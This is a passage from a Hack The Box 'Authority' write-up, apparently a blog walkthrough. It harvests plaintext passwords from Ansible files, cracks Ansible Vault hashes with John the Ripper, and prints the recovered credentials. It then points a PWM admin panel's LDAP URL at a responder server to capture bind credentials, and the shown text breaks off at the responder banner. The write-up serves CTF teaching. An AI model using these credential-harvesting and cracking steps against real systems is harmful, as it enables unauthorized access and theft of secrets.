<span class="n">Ansible</span><span class="o">/</span><span class="n">PWM</span><span class="o">/</span><span class="n">README</span><span class="o">.</span><span class="n">md</span><span class="p">:</span><span class="o">-</span> <span class="n">pwm_admin_password</span><span class="p">:</span> <span class="n">pwm</span> <span class="n">admin</span> <span class="n">password</span><span class="p">,</span> <span class="s1">'password'</span> <span class="n">by</span> <span class="n">default</span><span class="o">.</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">PWM</span><span class="o">/</span><span class="n">defaults</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span><span class="p">:</span><span class="n">pwm_admin_password</span><span class="p">:</span> <span class="err">!</span><span class="n">vault</span> <span class="o">|</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">PWM</span><span class="o">/</span><span class="n">defaults</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span><span class="p">:</span><span class="n">ldap_admin_password</span><span class="p">:</span> <span class="err">!</span><span class="n">vault</span> <span class="o">|</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="n">sssd</span><span class="o">.</span><span class="n">conf</span><span class="o">.</span><span class="n">j2</span><span class="p">:</span><span class="n">ldap_default_authtok_type</span> <span class="o">=</span> <span class="n">password</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="n">sssd</span><span class="o">.</span><span class="n">conf</span><span class="o">.</span><span class="n">j2</span><span class="p">:</span><span class="n">ldap_default_authtok</span> <span class="o">=</span> <span class="p">{{</span> <span class="n">system_ldap_bind_password</span> <span class="p">}}</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/.</span><span class="n">travis</span><span class="o">.</span><span class="n">yml</span><span class="p">:</span>  <span class="o">-</span> <span class="n">echo</span> <span class="s2">"$VAULT_PASSWORD"</span> <span class="o">&gt;</span> <span class="o">.</span><span class="n">vault_password</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/.</span><span class="n">travis</span><span class="o">.</span><span class="n">yml</span><span class="p">:</span>  <span class="o">-</span> <span class="n">ansible</span><span class="o">-</span><span class="n">playbook</span> <span class="n">tests</span><span class="o">/</span><span class="n">travis</span><span class="o">.</span><span class="n">yml</span> <span class="o">-</span><span class="n">i</span> <span class="n">localhost</span><span class="p">,</span> <span class="o">--</span><span class="n">vault</span><span class="o">-</span><span class="n">password</span><span class="o">-</span><span class="n">file</span> <span class="o">.</span><span class="n">vault_password</span> <span class="o">--</span><span class="n">syntax</span><span class="o">-</span><span class="n">check</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">tasks</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span><span class="p">:</span>    <span class="o">-</span> <span class="n">passwd</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">tasks</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span><span class="p">:</span><span class="o">-</span> <span class="n">name</span><span class="p">:</span> <span class="n">Query</span> <span class="n">SSSD</span> <span class="ow">in</span> <span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">password</span><span class="o">-</span><span class="n">auth</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">tasks</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span><span class="p">:</span>    <span class="n">dest</span><span class="p">:</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pam</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">password</span><span class="o">-</span><span class="n">auth</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">tasks</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span><span class="p">:</span>    <span class="o">-</span> <span class="p">{</span> <span class="n">before</span><span class="p">:</span> <span class="s2">"^password.*pam_deny.so"</span><span class="p">,</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">tasks</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span><span class="p">:</span>        <span class="n">regexp</span><span class="p">:</span> <span class="s2">"^password.*pam_sss.so"</span><span class="p">,</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">tasks</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span><span class="p">:</span>        <span class="n">line</span><span class="p">:</span> <span class="s2">"password    sufficient    pam_sss.so use_authtok"</span> <span class="p">}</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">tasks</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span><span class="p">:</span>    <span class="o">-</span> <span class="p">{</span> <span class="n">before</span><span class="p">:</span> <span class="s2">"^password.*pam_deny.so"</span><span class="p">,</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">tasks</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span><span class="p">:</span>        <span class="n">regexp</span><span class="p">:</span> <span class="s2">"^password.*pam_sss.so"</span><span class="p">,</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">tasks</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span><span class="p">:</span>        <span class="n">line</span><span class="p">:</span> <span class="s2">"password    sufficient    pam_sss.so use_authtok"</span> <span class="p">}</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">tasks</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span><span class="p">:</span><span class="o">-</span> <span class="n">name</span><span class="p">:</span> <span class="n">Allow</span><span class="o">/</span><span class="n">Disallow</span> <span class="n">password</span> <span class="n">authentication</span> <span class="ow">in</span> <span class="n">SSHD</span> <span class="n">config</span> <span class="k">for</span> <span class="n">users</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">tasks</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span><span class="p">:</span>      <span class="n">PasswordAuthentication</span> <span class="n">yes</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">tasks</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span><span class="p">:</span>    <span class="n">state</span><span class="p">:</span> <span class="s2">"{{ 'present' if system_ldap_allow_passwordauth_in_sshd and system_ldap_access_filter_users else 'absent' }}"</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">tasks</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span><span class="p">:</span><span class="o">-</span> <span class="n">name</span><span class="p">:</span> <span class="n">Allow</span><span class="o">/</span><span class="n">Disallow</span> <span class="n">password</span> <span class="n">authentication</span> <span class="ow">in</span> <span class="n">SSHD</span> <span class="n">config</span> <span class="k">for</span> <span class="n">groups</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">tasks</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span><span class="p">:</span>      <span class="n">PasswordAuthentication</span> <span class="n">yes</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">tasks</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span><span class="p">:</span>    <span class="n">state</span><span class="p">:</span> <span class="s2">"{{ 'present' if system_ldap_allow_passwordauth_in_sshd and system_ldap_access_unix_groups else 'absent' }}"</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">TODO</span><span class="o">.</span><span class="n">md</span><span class="p">:</span><span class="o">-</span> <span class="n">Change</span> <span class="n">LDAP</span> <span class="n">admin</span> <span class="n">password</span> <span class="n">after</span> <span class="n">build</span> <span class="o">-</span><span class="p">[</span><span class="n">COMPLETE</span><span class="p">]</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/.</span><span class="n">bin</span><span class="o">/</span><span class="n">clean_vault</span><span class="p">:</span> <span class="n">Just</span> <span class="nb">print</span> <span class="n">out</span> <span class="n">the</span> <span class="n">secrets</span> <span class="n">file</span> <span class="k">as</span><span class="o">-</span><span class="ow">is</span> <span class="k">if</span> <span class="n">the</span> <span class="n">password</span> <span class="n">file</span> <span class="n">doesn</span><span class="s1">'t exist</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/.</span><span class="n">bin</span><span class="o">/</span><span class="n">clean_vault</span><span class="p">:</span><span class="k">if</span> <span class="p">[</span> <span class="err">!</span> <span class="o">-</span><span class="n">r</span> <span class="s1">'.vault_password'</span> <span class="p">];</span> <span class="n">then</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/.</span><span class="n">bin</span><span class="o">/</span><span class="n">clean_vault</span><span class="p">:</span>    <span class="n">RESULT</span><span class="o">=</span><span class="s2">"$(echo "</span><span class="err">$</span><span class="n">CONTENT</span><span class="s2">" | ansible-vault encrypt - --vault-password-file=.vault_password 2&gt;&amp;1 1&gt;&amp;$OUT)"</span><span class="p">;</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/.</span><span class="n">bin</span><span class="o">/</span><span class="n">diff_vault</span><span class="p">:</span> <span class="n">Just</span> <span class="nb">print</span> <span class="n">out</span> <span class="n">the</span> <span class="n">secrets</span> <span class="n">file</span> <span class="k">as</span><span class="o">-</span><span class="ow">is</span> <span class="k">if</span> <span class="n">the</span> <span class="n">password</span> <span class="n">file</span> <span class="n">doesn</span><span class="s1">'t exist</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/.</span><span class="n">bin</span><span class="o">/</span><span class="n">diff_vault</span><span class="p">:</span><span class="k">if</span> <span class="p">[</span> <span class="err">!</span> <span class="o">-</span><span class="n">r</span> <span class="s1">'.vault_password'</span> <span class="p">];</span> <span class="n">then</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/.</span><span class="n">bin</span><span class="o">/</span><span class="n">diff_vault</span><span class="p">:</span><span class="n">CONTENT</span><span class="o">=</span><span class="s2">"$(ansible-vault view "</span><span class="err">$</span><span class="mi">1</span><span class="s2">" --vault-password-file=.vault_password 2&gt;&amp;1)"</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/.</span><span class="n">bin</span><span class="o">/</span><span class="n">smudge_vault</span><span class="p">:</span> <span class="n">Just</span> <span class="nb">print</span> <span class="n">out</span> <span class="n">the</span> <span class="n">secrets</span> <span class="n">file</span> <span class="k">as</span><span class="o">-</span><span class="ow">is</span> <span class="k">if</span> <span class="n">the</span> <span class="n">password</span> <span class="n">file</span> <span class="n">doesn</span><span class="s1">'t exist</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/.</span><span class="n">bin</span><span class="o">/</span><span class="n">smudge_vault</span><span class="p">:</span><span class="k">if</span> <span class="p">[</span> <span class="err">!</span> <span class="o">-</span><span class="n">r</span> <span class="s1">'.vault_password'</span> <span class="p">];</span> <span class="n">then</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/.</span><span class="n">bin</span><span class="o">/</span><span class="n">smudge_vault</span><span class="p">:</span>    <span class="n">RESULT</span><span class="o">=</span><span class="s2">"$(echo "</span><span class="err">$</span><span class="n">CONTENT</span><span class="s2">" | ansible-vault decrypt - --vault-password-file=.vault_password 2&gt;&amp;1 1&gt;&amp;$OUT)"</span><span class="p">;</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">README</span><span class="o">.</span><span class="n">md</span><span class="p">:</span><span class="o">|</span><span class="err">`</span><span class="n">system_ldap_bind_password</span><span class="err">`</span><span class="o">|</span><span class="err">`</span><span class="n">sunrise</span><span class="err">`</span><span class="o">|</span><span class="n">The</span> <span class="n">authentication</span> <span class="n">token</span> <span class="n">of</span> <span class="n">the</span> <span class="n">default</span> <span class="n">bind</span> <span class="n">DN</span><span class="o">.</span> <span class="n">Only</span> <span class="n">clear</span> <span class="n">text</span> <span class="n">passwords</span> <span class="n">are</span> <span class="n">currently</span> <span class="n">supported</span><span class="o">.|</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">README</span><span class="o">.</span><span class="n">md</span><span class="p">:</span><span class="o">|</span><span class="err">`</span><span class="n">system_ldap_allow_passwordauth_in_sshd</span><span class="err">`</span><span class="o">|</span><span class="err">`</span><span class="n">true</span><span class="err">`</span><span class="o">|</span><span class="n">Specifies</span> <span class="n">whether</span> <span class="n">to</span> <span class="n">configure</span> <span class="err">`</span><span class="n">sshd_config</span><span class="err">`</span> <span class="n">to</span> <span class="n">allow</span> <span class="n">password</span> <span class="n">authentication</span> <span class="k">for</span> <span class="n">authorized</span> <span class="n">users</span><span class="o">.</span> <span class="n">This</span> <span class="ow">is</span> <span class="n">needed</span> <span class="k">if</span> <span class="n">your</span> <span class="n">SSHD</span> <span class="ow">is</span> <span class="n">configured</span> <span class="n">to</span> <span class="ow">not</span> <span class="n">allow</span> <span class="n">password</span> <span class="n">authentication</span> <span class="n">by</span> <span class="n">default</span><span class="o">.</span> <span class="n">Defaults</span> <span class="n">to</span> <span class="err">`</span><span class="n">false</span><span class="err">`</span><span class="o">.|</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">README</span><span class="o">.</span><span class="n">md</span><span class="p">:</span>    <span class="n">system_ldap_bind_password</span><span class="p">:</span> <span class="n">sunrise</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">README</span><span class="o">.</span><span class="n">md</span><span class="p">:</span><span class="n">Here</span> <span class="n">we</span><span class="s1">'re using a search user account and password (`system_ldap_bind_*`) to </span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">README</span><span class="o">.</span><span class="n">md</span><span class="p">:</span>    <span class="n">system_ldap_allow_passwordauth_in_sshd</span><span class="p">:</span> <span class="n">true</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">defaults</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span><span class="p">:</span><span class="n">system_ldap_allow_passwordauth_in_sshd</span><span class="p">:</span> <span class="n">false</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">defaults</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span><span class="p">:</span><span class="n">system_ldap_bind_password</span><span class="p">:</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">Vagrantfile</span><span class="p">:</span>    <span class="n">ansible</span><span class="o">.</span><span class="n">vault_password_file</span> <span class="o">=</span> <span class="s2">".vault_password"</span>
</pre></div>

With numerous matches, upon inspecting the entire output, I identified the following passwords:<br/><br/>
<div class="highlight"><pre><span></span>secret
T0mc@tAdm1n
T0mc@tR00t
Welcome1
sunrise
</pre></div>

I attempted to use these passwords in PWM, but they did not work. They also do not work for the <code>svc_ldap</code> user.<br/><br/>
While examining the <code>PWM</code> directories, I found the following file in <code>Automation/Ansible/PWM/defaults</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">main</span><span class="o">.</span><span class="n">yml</span>
<span class="o">---</span>
<span class="n">pwm_run_dir</span><span class="p">:</span> <span class="s2">"{{ lookup('env', 'PWD') }}"</span>

<span class="n">pwm_hostname</span><span class="p">:</span> <span class="n">authority</span><span class="o">.</span><span class="n">htb</span><span class="o">.</span><span class="n">corp</span>
<span class="n">pwm_http_port</span><span class="p">:</span> <span class="s2">"{{ http_port }}"</span>
<span class="n">pwm_https_port</span><span class="p">:</span> <span class="s2">"{{ https_port }}"</span>
<span class="n">pwm_https_enable</span><span class="p">:</span> <span class="n">true</span>

<span class="n">pwm_require_ssl</span><span class="p">:</span> <span class="n">false</span>

<span class="n">pwm_admin_login</span><span class="p">:</span> <span class="err">!</span><span class="n">vault</span> <span class="o">|</span>
          <span class="err">$</span><span class="n">ANSIBLE_VAULT</span><span class="p">;</span><span class="mf">1.1</span><span class="p">;</span><span class="n">AES256</span>
          <span class="mi">32666534386435366537653136663731633138616264323230383566333966346662313161326239</span>
          <span class="mi">6134353663663462373265633832356663356239383039640</span><span class="n">a346431373431666433343434366139</span>
          <span class="mi">35653634376333666234613466396534343030656165396464323564373334616262613439343033</span>
          <span class="mi">6334326263326364380</span><span class="n">a653034313733326639323433626130343834663538326439636232306531</span>
          <span class="mi">3438</span>

<span class="n">pwm_admin_password</span><span class="p">:</span> <span class="err">!</span><span class="n">vault</span> <span class="o">|</span>
          <span class="err">$</span><span class="n">ANSIBLE_VAULT</span><span class="p">;</span><span class="mf">1.1</span><span class="p">;</span><span class="n">AES256</span>
          <span class="mi">31356338343963323063373435363261323563393235633365356134616261666433393263373736</span>
          <span class="mi">3335616263326464633832376261306131303337653964350</span><span class="n">a363663623132353136346631396662</span>
          <span class="mi">38656432323830393339336231373637303535613636646561653637386634613862316638353530</span>
          <span class="mi">3930356637306461350</span><span class="n">a316466663037303037653761323565343338653934646533663365363035</span>
          <span class="mi">6531</span>

<span class="n">ldap_uri</span><span class="p">:</span> <span class="n">ldap</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span><span class="o">/</span>
<span class="n">ldap_base_dn</span><span class="p">:</span> <span class="s2">"DC=authority,DC=htb"</span>
<span class="n">ldap_admin_password</span><span class="p">:</span> <span class="err">!</span><span class="n">vault</span> <span class="o">|</span>
          <span class="err">$</span><span class="n">ANSIBLE_VAULT</span><span class="p">;</span><span class="mf">1.1</span><span class="p">;</span><span class="n">AES256</span>
          <span class="mi">63303831303534303266356462373731393561313363313038376166336536666232626461653630</span>
          <span class="mi">3437333035366235613437373733316635313530326639330</span><span class="n">a643034623530623439616136363563</span>
          <span class="mi">34646237336164356438383034623462323531316333623135383134656263663266653938333334</span>
          <span class="mi">3238343230333633350</span><span class="n">a646664396565633037333431626163306531336336326665316430613566</span>
          <span class="mi">3764</span>
</pre></div>

The content of the file is quite interesting. It stores three encrypted Ansible Vaults. Ansible Vaults refer to a feature in Ansible that provides a way to encrypt and protect sensitive information, such as passwords, SSH keys, and other secrets. An Ansible Vault is essentially an encryption tool that allows secure storage of confidential data within Ansible configuration files.<br/><br/>
Sensitive information is stored in encrypted files called "Vaults", and Ansible provides specific commands and modules to work with these Vaults securely. This helps ensure that the secrets needed for task automation are protected and only accessible by those authorized to use them.<br/><br/>
To decrypt these vaults, we need to specify the password with which the vaults were encrypted. Since we obtained some credentials while inspecting the resources, let's try using them to decrypt the vaults:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">vault1</span><span class="o">.</span><span class="n">yml</span>
<span class="err">$</span><span class="n">ANSIBLE_VAULT</span><span class="p">;</span><span class="mf">1.1</span><span class="p">;</span><span class="n">AES256</span>
<span class="mi">32666534386435366537653136663731633138616264323230383566333966346662313161326239</span>
<span class="mi">6134353663663462373265633832356663356239383039640</span><span class="n">a346431373431666433343434366139</span>
<span class="mi">35653634376333666234613466396534343030656165396464323564373334616262613439343033</span>
<span class="mi">6334326263326364380</span><span class="n">a653034313733326639323433626130343834663538326439636232306531</span>
<span class="mi">3438</span>
</pre></div>

To achieve this, we need to install <code>ansible</code> using the <code>apt</code> package manager, which is available on Kali:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">apt</span> <span class="n">install</span> <span class="n">ansible</span>
</pre></div>

Now, using the <code>ansible-vault</code> tool, we can attempt to decrypt these vaults:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">ansible</span><span class="o">-</span><span class="n">vault</span> <span class="n">decrypt</span> <span class="n">vault1</span><span class="o">.</span><span class="n">yml</span> <span class="o">--</span><span class="n">output</span> <span class="n">vault1</span><span class="o">.</span><span class="n">txt</span>
<span class="n">Vault</span> <span class="n">password</span><span class="p">:</span> 
<span class="n">ERROR</span><span class="err">!</span> <span class="n">Decryption</span> <span class="n">failed</span> <span class="p">(</span><span class="n">no</span> <span class="n">vault</span> <span class="n">secrets</span> <span class="n">were</span> <span class="n">found</span> <span class="n">that</span> <span class="n">could</span> <span class="n">decrypt</span><span class="p">)</span> <span class="n">on</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">Authority</span><span class="o">/</span><span class="n">content</span><span class="o">/</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">PWM</span><span class="o">/</span><span class="n">defaults</span><span class="o">/</span><span class="n">vault1</span><span class="o">.</span><span class="n">yml</span> <span class="k">for</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">Authority</span><span class="o">/</span><span class="n">content</span><span class="o">/</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">PWM</span><span class="o">/</span><span class="n">defaults</span><span class="o">/</span><span class="n">vault1</span><span class="o">.</span><span class="n">yml</span>
</pre></div>

After specifying all the passwords we found, I couldn't decrypt any of these vaults.<br/><br/>
Another approach we can try to obtain the corresponding password is to use the <code>ansible2john</code> tool to generate a hash equivalent to the password and attempt to break it through brute force using the <a href="https://github.com/openwall/john">John the Ripper</a> tool.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">ansible2john</span> <span class="n">vault1</span><span class="o">.</span><span class="n">yml</span> <span class="o">&gt;</span> <span class="nb">hash</span>
</pre></div>

Now, using <code>john</code>, we can attempt to obtain the vault password through brute force:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">john</span> <span class="o">-</span><span class="n">w</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span> <span class="nb">hash</span>
<span class="n">Using</span> <span class="n">default</span> <span class="nb">input</span> <span class="n">encoding</span><span class="p">:</span> <span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
<span class="n">Loaded</span> <span class="mi">1</span> <span class="n">password</span> <span class="nb">hash</span> <span class="p">(</span><span class="n">ansible</span><span class="p">,</span> <span class="n">Ansible</span> <span class="n">Vault</span> <span class="p">[</span><span class="n">PBKDF2</span><span class="o">-</span><span class="n">SHA256</span> <span class="n">HMAC</span><span class="o">-</span><span class="mi">256</span> <span class="mi">128</span><span class="o">/</span><span class="mi">128</span> <span class="n">AVX</span> <span class="mi">4</span><span class="n">x</span><span class="p">])</span>
<span class="n">Cost</span> <span class="mi">1</span> <span class="p">(</span><span class="n">iteration</span> <span class="n">count</span><span class="p">)</span> <span class="ow">is</span> <span class="mi">10000</span> <span class="k">for</span> <span class="nb">all</span> <span class="n">loaded</span> <span class="n">hashes</span>
<span class="n">Will</span> <span class="n">run</span> <span class="mi">4</span> <span class="n">OpenMP</span> <span class="n">threads</span>
<span class="n">Press</span> <span class="s1">'q'</span> <span class="ow">or</span> <span class="n">Ctrl</span><span class="o">-</span><span class="n">C</span> <span class="n">to</span> <span class="n">abort</span><span class="p">,</span> <span class="n">almost</span> <span class="nb">any</span> <span class="n">other</span> <span class="n">key</span> <span class="k">for</span> <span class="n">status</span>


<span class="err">!</span><span class="o">@</span><span class="c1">#$%^&amp;*         (vault1.yml)     </span>


<span class="mi">1</span><span class="n">g</span> <span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">46</span> <span class="n">DONE</span> <span class="p">(</span><span class="mi">2023</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">08</span> <span class="mi">13</span><span class="p">:</span><span class="mi">39</span><span class="p">)</span> <span class="mf">0.02146</span><span class="n">g</span><span class="o">/</span><span class="n">s</span> <span class="mf">854.4</span><span class="n">p</span><span class="o">/</span><span class="n">s</span> <span class="mf">854.4</span><span class="n">c</span><span class="o">/</span><span class="n">s</span> <span class="mf">854.4</span><span class="n">C</span><span class="o">/</span><span class="n">s</span> <span class="mf">001983.</span><span class="o">.</span><span class="n">victor2</span>
<span class="n">Use</span> <span class="n">the</span> <span class="s2">"--show"</span> <span class="n">option</span> <span class="n">to</span> <span class="n">display</span> <span class="nb">all</span> <span class="n">of</span> <span class="n">the</span> <span class="n">cracked</span> <span class="n">passwords</span> <span class="n">reliably</span>
<span class="n">Session</span> <span class="n">completed</span><span class="o">.</span>
</pre></div>

We successfully obtained the password in plaintext. Now, let's attempt to decrypt the vault using this password:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">ansible</span><span class="o">-</span><span class="n">vault</span> <span class="n">decrypt</span> <span class="n">vault1</span><span class="o">.</span><span class="n">yml</span> <span class="o">--</span><span class="n">output</span> <span class="n">vault1</span><span class="o">.</span><span class="n">txt</span>
<span class="n">Vault</span> <span class="n">password</span><span class="p">:</span> 
<span class="n">Decryption</span> <span class="n">successful</span>
</pre></div>

Great! It worked, and now we can list its content by reading the output file <code>vault1.txt</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">vault1</span><span class="o">.</span><span class="n">txt</span>
<span class="n">svc_pwm</span>
</pre></div>

The content of this vault doesn't seem to be interesting. Let's try using the same password to decrypt the other vaults.<br/><br/>
The other two vaults are known to store passwords:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">vault2</span><span class="o">.</span><span class="n">txt</span>
<span class="n">pWm_</span><span class="nd">@dm</span><span class="err">!</span><span class="n">N_</span><span class="err">!</span><span class="mi">23</span>
<span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">vault3</span><span class="o">.</span><span class="n">txt</span>
<span class="n">DevT3st</span><span class="o">@</span><span class="mi">123</span>
</pre></div>
<h3><br>Shell as svc_ldap</br></h3><br>
Using these passwords to authenticate to PWM, the password <code>pWm_@dm!N_!23</code> is valid and allowed me to access the <code>Configuration Manager</code>:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/authority/img/5.png"/><br/><br/>
Since I wasn't familiar with how PWM works, I searched for information on the internet.<br/><br/>
Firstly, I clicked on <code>Configuration Editor</code>:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/authority/img/6.png"/><br/><br/>
After clicking on <code>Configuration Editor</code>, I was redirected to the following page:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/authority/img/7.png"/><br/><br/>
Upon exploring the functionalities available in this panel, I identified a way to generate an LDAP request by clicking on <code>LDAP -&gt; LDAP Directories -&gt; default -&gt; Connection</code>:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/authority/img/8.png"/><br/><br/>
In the <code>LDAP URLs</code> field, I can add a value (URL). Therefore, I attempted to add a URL to my LDAP server.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/authority/img/9.png"/><br/><br/>
Now, we need to click on <code>Test LDAP Profile</code> to make a request. However, before doing that, we have to set up our malicious LDAP server. For this purpose, I will use the <code>responder</code> tool:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">responder</span> <span class="o">-</span><span class="n">I</span> <span class="n">tun0</span> <span class="o">-</span><span class="n">v</span>
                                         <span class="n">__</span>
  <span class="o">.----.-----.-----.-----.-----.-----.--|</span>  <span class="o">|.-----.----.</span>
  <span class="o">|</span>   <span class="n">_</span><span class="o">|</span>  <span class="o">-</span><span class="n">__</span><span class="o">|</span><span class="n">__</span> <span class="o">--|</span>  <span class="n">_</span>  <span class="o">|</span>  <span class="n">_</span>  <span class="o">|</span>     <span class="o">|</span>  <span class="n">_</span>  <span class="o">||</span>  <span class="o">-</span><span class="n">__</span><span class="o">|</span>   <span class="n">_</span><span class="o">|</span>
  <span class="o">|</span><span class="n">__</span><span class="o">|</span> <span class="o">|</span><span class="n">_____</span><span class="o">|</span><span class="n">_____</span><span class="o">|</span>   <span class="n">__</span><span class="o">|</span><span class="n">_____</span><span class="o">|</span><span class="n">__</span><span class="o">|</span><span class="n">__</span><span class="o">|</span><span class="n">_____</span><span class="o">||</span><span class="n">_____</span><span class="o">|</span><span class="n">__</span><span class="o">|</span>
                   <span class="o">|</span><span class="n">__</span><span class="o">|</span>

